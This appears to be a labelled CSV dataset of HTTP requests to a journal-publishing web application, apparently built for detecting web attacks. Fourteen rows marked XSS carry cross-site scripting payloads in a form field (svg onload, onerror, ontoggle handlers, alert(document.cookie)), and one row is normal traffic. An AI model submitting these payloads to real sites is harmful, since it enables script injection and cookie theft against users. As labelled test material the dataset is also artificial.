request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
fced5d4bf8d7d482f847f8ccf82d5e29,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%2fonload%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,390,172.19.2.40,36296,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
14235acfaedafd8b7942f32564f3fd7a,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%20onload%3dconfirm(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,392,172.19.2.40,36298,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d8b943083835a569b0f0888c141af6b6,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cSVG%20ONLOAD%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,390,172.19.2.40,36308,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
0310361c0dedce3071050c8633afe936,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%20onload%3dprompt(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,391,172.19.2.40,36320,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
743ae884c8bd55c4d08381a36ee3b19b,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%20onload%3dalert(document%2edomain)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,406,172.19.2.40,36322,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
9f5094a0825da16d6a269428e4400cd3,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%20onload%3dalert(document%2ecookie)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,406,172.19.2.40,36358,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
21e7328b5c162a459b9d0d228ad65f86,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cvideo%20src%3dx%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36336,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
71e5dd76f31b9a89d45ef76f8abfcd42,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3caudio%20src%3dx%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36310,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
8d18ba500f9cfe8bfda1d8c1e84408b3,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cvideo%3e%3csource%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,405,172.19.2.40,36350,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
769b4d95b296958799643b8983b0e0b3,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cdetails%20open%20ontoggle%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36364,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
99709afa7eca4f555301ea5da08050d7,"Fri, 12 Jun 2026 07:50:14 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cdetails%2fopen%2fontoggle%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36298,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
19b132304fccb538d882d1e0f00fb074,"Fri, 12 Jun 2026 07:50:14 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cbody%20onload%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,391,172.19.2.40,36296,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d4f0991433507c376d342a9af05c7660,"Fri, 12 Jun 2026 07:50:14 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3ciframe%20onload%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,393,172.19.2.40,36322,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f45e9dc36b0607115eb013284d35d7ae,"Fri, 12 Jun 2026 07:50:14 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3ciframe%20src%3dx%20onload%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36308,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
57fa3b1ea565d82790690e41464d25a1,"Fri, 12 Jun 2026 07:50:32 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=test&comment=%3Cp%3EThis+paper+examines+carbon+sequestration+potential+in+reforestation+projects+and+evaluates+their+cost-effectiveness+as+climate+change+mitigation+strategies.%3C%2Fp%3E&submitFormButton=,298,172.19.2.40,44330,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",Normal
